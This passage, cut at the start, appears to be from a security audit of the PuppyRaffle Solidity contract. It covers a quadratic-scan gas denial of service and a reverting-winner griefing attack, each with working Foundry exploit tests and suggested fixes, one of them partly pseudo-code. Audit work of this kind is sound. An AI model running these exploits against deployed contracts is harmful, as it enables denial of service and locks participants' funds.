        vm.expectRevert(bytes("PuppyRaffle: Failed to send prize pool to winner"));
        pr.selectWinner();
        // Still bricked; funds remain in contract
        assertEq(address(pr).balance, 2 * entranceFee);
    }
}


## Suggested Mitigation
Avoid scanning zeroed slots or, better, track membership explicitly. Options:
- Skip address(0) in duplicate check: only compare nonzero entries.
- Validate newPlayers against existing active players and within themselves before pushing, ignoring address(0).
- Maintain a mapping(address=>bool) isActive to enforce uniqueness in O(1) and update it on refund.

Example fix (minimal):

// Before pushing, validate
for (uint256 x = 0; x < newPlayers.length; x++) {
    address p = newPlayers[x];
    require(p != address(0), "zero addr disallowed");
    // ensure no dup within batch
    for (uint256 y = x + 1; y < newPlayers.length; y++) {
        require(p != newPlayers[y], "duplicate in batch");
    }
    // ensure not already active (ignore zero holes)
    for (uint256 i = 0; i < players.length; i++) {
        address q = players[i];
        if (q != address(0)) require(p != q, "already active");
    }
}
for (uint256 x = 0; x < newPlayers.length; x++) {
    players.push(newPlayers[x]);
}

Or use a storage mapping isActive and set/unset it on enter/refund for O(1) checks and no zero-hole interference.


## [M-2]. Quadratic duplicate scan in PuppyRaffle.enterRaffle enables gas-based DoS via players array bloat

## Derived From Pattern/Invariant
Nested O(n^2) duplicate scan in enterRaffle allows gas-based DoS

## Exploit Type
GasGriefBlockLimit

## Location
PuppyRaffle.enterRaffle

## Minimim Privilege Required
Permissionless

## Description
enterRaffle first appends all new players, then runs a quadratic duplicate scan across the entire players array. Because both loops are unbounded and depend on user-controlled input, an attacker can bloat players to make subsequent entries exceed typical gas limits and revert.

Vulnerable snippet:

function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    for (uint256 i = 0; i < newPlayers.length; i++) {
        players.push(newPlayers[i]);
    }

    // Check for duplicates
    for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
    emit RaffleEnter(newPlayers);
}

Impact: After an attacker appends a large batch of unique addresses, the nested O(n^2) scan on every subsequent enterRaffle call can exceed reasonable gas limits, causing permissionless DoS for new entrants until the round ends and selectWinner clears players.

## Impact
Temporary, permissionless DoS of the core entry flow: honest users cannot enter the raffle during the current round because enterRaffle runs out of gas scanning players.length^2. This suppresses participation and pot growth, and can persist until selectWinner resets players. Attack cost can be reduced by batching entries and later self-refunding slots (leaving array length large but reclaiming funds), making the grief economically feasible.

## Proof of Concept
1) Attacker appends a large batch of unique addresses (size N chosen so the initial bloat succeeds within block gas, e.g., N≈400). This passes the duplicate scan once. 2) Subsequent small entries now trigger an O(players.length^2) duplicate scan, making them exceed typical wallet gas budgets and revert when sent with a realistic gas cap. 3) A gas-limited proxy call demonstrates that the same small entry which succeeded pre-bloat fails post-bloat under the same gas cap, proving a permissionless gas-based DoS until the round resets.

## Proof of Code
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract GasLimitedCaller {
    function tryEnter(address raffle, address[] memory addrs, uint256 amount, uint256 gasToUse)
        external
        payable
        returns (bool success)
    {
        (success,) = raffle.call{gas: gasToUse, value: amount}(abi.encodeWithSignature("enterRaffle(address[])", addrs));
    }
    receive() external payable {}
}

contract PuppyRaffle_GasDoS_Test is Test {
    PuppyRaffle raffle;
    GasLimitedCaller caller;
    address attacker = address(0xA11CE);
    address feeAddress = address(0xFEE);
    uint256 entranceFee = 1; // 1 wei for testing
    uint256 duration = 1 days;

    function setUp() public {
        raffle = new PuppyRaffle(entranceFee, feeAddress, duration);
        caller = new GasLimitedCaller();
        vm.deal(address(this), 100 ether);
        vm.deal(attacker, 100 ether);
        vm.deal(address(caller), 100 ether);
    }

    function _makeAddresses(uint256 n, uint256 offset) internal pure returns (address[] memory arr) {
        arr = new address[](n);
        for (uint256 i = 0; i < n; i++) {
            arr[i] = address(uint160(offset + i + 1));
        }
    }

    function test_GasDoS_EnterRaffle() public {
        // Pre-bloat: small entry with limited gas succeeds
        address[] memory small = _makeAddresses(1, 0x100);
        uint256 gasLimit = 2_000_000; // representative wallet gas budget
        bool okPre = caller.tryEnter{value: entranceFee}(address(raffle), small, entranceFee, gasLimit);
        assertTrue(okPre, "pre-bloat small enter should succeed under gas limit");

        // Attacker bloats players with many unique addresses; choose N so this tx succeeds
        uint256 N = 400; // ~80,000 comparisons in the nested scan; fits within block gas
        address[] memory big = _makeAddresses(N, 0x1000);
        vm.prank(attacker);
        raffle.enterRaffle{value: entranceFee * N}(big);

        // Post-bloat: same small entry under same gas limit now fails (out of gas) due to quadratic scan
        address[] memory victim = _makeAddresses(1, 0xDEAD);
        bool okPost = caller.tryEnter{value: entranceFee}(address(raffle), victim, entranceFee, gasLimit);
        assertFalse(okPost, "post-bloat small enter should fail under same gas limit -> DoS");
    }
}


## Suggested Mitigation
Avoid scanning players^2. Validate duplicates in O(k) for k = newPlayers.length and use a storage membership map for O(1) existing checks. Example:

function enterRaffle(address[] calldata newPlayers) external payable {
    require(msg.value == entranceFee * newPlayers.length, "bad value");
    // memory-level check for dupes within the batch
    mapping(address => bool) storage isActive = _isActive; // declare at contract level: mapping(address => bool) _isActive;
    // use a temporary memory map via a local array + boolean map (or sort), here pseudo-code uses a mapping-like pattern
    // since solidity doesn't support memory mappings, do a two-pass: first check against storage, then mark in a local bitmap structure or sort newPlayers and check neighbors
    // Simpler: check against storage and build a temporary set via a hash in assembly or use sorting (n log n). For clarity, show storage+sorting approach:
    address[] memory np = newPlayers;
    // sort np (e.g., in-place quicksort) then check adjacent equality to detect in-batch dupes
    _sort(np);
    for (uint256 i = 0; i < np.length; i++) {
        require(np[i] != address(0), "zero addr");
        if (i > 0) require(np[i] != np[i-1], "duplicate in batch");
        require(!isActive[np[i]], "duplicate existing");
    }
    // commit
    for (uint256 i = 0; i < np.length; i++) {
        isActive[np[i]] = true;
        players.push(np[i]);
    }
    emit RaffleEnter(newPlayers);
}

function refund(uint256 idx) public {
    address p = players[idx];
    require(p == msg.sender && p != address(0), "not player/active");
    _isActive[p] = false; // keep membership in sync
    payable(msg.sender).sendValue(entranceFee);
    players[idx] = address(0);
}

function selectWinner() external { /* ... */
    // after choosing winner and before delete players, clear membership for next round
    for (uint256 i = 0; i < players.length; i++) {
        address p = players[i];
        if (p != address(0)) _isActive[p] = false;
    }
    delete players;
    // rest unchanged
}

This reduces enterRaffle from O(n^2) to O(k log k + k), eliminating gas-based DoS.


## [M-3]. selectWinner is griefable: reverting winner fallback bricks payout and stalls the raffle

## Derived From Pattern/Invariant
Winner’s fallback can revert to block prize payout and stall raffle progress

## Exploit Type
Dos

## Location
PuppyRaffle.selectWinner

## Minimim Privilege Required
Permissionless

## Description
PuppyRaffle.selectWinner pays the winner using a low-level call and requires success. Any entrant can enter via a contract whose receive/fallback reverts; if selected, the external call fails and the entire selectWinner transaction reverts, preventing raffle progress and keeping user funds stuck. There is no try/catch or fallback payout path. Vulnerable snippet:

delete players;
raffleStartTime = block.timestamp;
previousWinner = winner;
(bool success,) = winner.call{value: prizePool}("");
require(success, "PuppyRaffle: Failed to send prize pool to winner");
_safeMint(winner, tokenId);

Because the revert bubbles up, players are never reset and funds remain in the contract until a non-reverting winner is selected. An attacker can repeatedly call selectWinner at chosen timestamps to make themselves the winner and force reverts, griefing the protocol.

## Impact
Temporary but repeatable DoS of core settlement path: winner selection cannot complete, pot cannot be paid, NFT not minted, and fees not accrued. Funds remain stuck in the contract (entire pot) until a successful payout, enabling sustained griefing of all participants.

## Proof of Concept
1) Attacker deploys a contract with a reverting receive/fallback.
2) Attacker enters the raffle with this contract address among the players.
3) After raffleDuration, attacker or anyone calls selectWinner at a timestamp where RNG selects the attacker index.
4) The value-carrying low-level call to attacker reverts; selectWinner reverts; state changes are rolled back; pot remains fully stuck in the contract.
5) Attacker can keep attempting at chosen timestamps to keep being selected and continuously DoS the raffle.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract RevertingWinner {
    receive() external payable { revert("nope"); }
}

contract PuppyRaffle_GriefableCallbacks_Test is Test {
    PuppyRaffle internal raffle;
    uint256 internal constant ENTRANCE_FEE = 1 ether;
    uint256 internal constant DURATION = 1 days;
    address internal constant FEE_ADDR = address(99);

    RevertingWinner internal attacker;

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, FEE_ADDR, DURATION);
        attacker = new RevertingWinner();
        vm.deal(address(this), 100 ether);
    }

    function test_DoS_selectWinner_byRevertingWinner() public {
        // Arrange: 4 players including the malicious winner contract at index 0
        address p2 = address(2);
        address p3 = address(3);
        address p4 = address(4);
        address[] memory players = new address[](4);
        players[0] = address(attacker);
        players[1] = p2;
        players[2] = p3;
        players[3] = p4;

        raffle.enterRaffle{value: ENTRANCE_FEE * players.length}(players);

        // Time travel so raffle can be settled
        vm.warp(raffle.raffleStartTime() + DURATION + 1);

        uint256 preBalance = address(raffle).balance; // should be full pot (4 * fee)
        uint64 preFees = raffle.totalFees();          // 0 before selection
        address prePrev = raffle.previousWinner();    // zero before selection
        assertEq(preBalance, ENTRANCE_FEE * players.length);
        assertEq(preFees, 0);
        assertEq(prePrev, address(0));

        // We will pick a caller and advance time until the RNG selects index 0 (attacker)
        address caller = address(1234);
        for (uint256 i = 0; i < 512; i++) {
            vm.warp(block.timestamp + 1);
            uint256 idx = uint256(keccak256(abi.encodePacked(caller, block.timestamp, block.difficulty))) % players.length;
            if (idx == 0) {
                // Act: Expect revert due to reverting fallback of winner
                vm.prank(caller);
                vm.expectRevert(bytes("PuppyRaffle: Failed to send prize pool to winner"));
                raffle.selectWinner();

                // Assert: No state changed, funds remain stuck (DoS)
                assertEq(address(raffle).balance, preBalance);
                assertEq(raffle.totalFees(), preFees);
                assertEq(raffle.previousWinner(), prePrev);
                return;
            }
        }
        fail("Could not find timestamp selecting attacker as winner");
    }
}


## Suggested Mitigation
Make payouts non-blocking. Use a pull pattern or fallback to crediting owed prizes instead of requiring the external call to succeed. Example:

// Add storage
mapping(address => uint256) public pendingPrize;

function selectWinner() external {
    // ... compute winner and prizePool
    delete players;
    raffleStartTime = block.timestamp;
    previousWinner = winner;
    pendingPrize[winner] += prizePool; // record owed amount first

    // Try best-effort push; do not revert on failure
    (bool ok, ) = winner.call{value: prizePool}("");
    if (ok) {
        pendingPrize[winner] = 0;
    }
    _safeMint(winner, tokenId);
}

function claimPrize() external {
    uint256 amount = pendingPrize[msg.sender];
    require(amount > 0, "No prize");
    pendingPrize[msg.sender] = 0;
    (bool ok, ) = msg.sender.call{value: amount}("");
    require(ok, "Transfer failed");
}

This ensures the raffle can always progress even if the winner rejects ETH. Optionally add a claimTo(address) to support contracts or use OZ PullPayment.




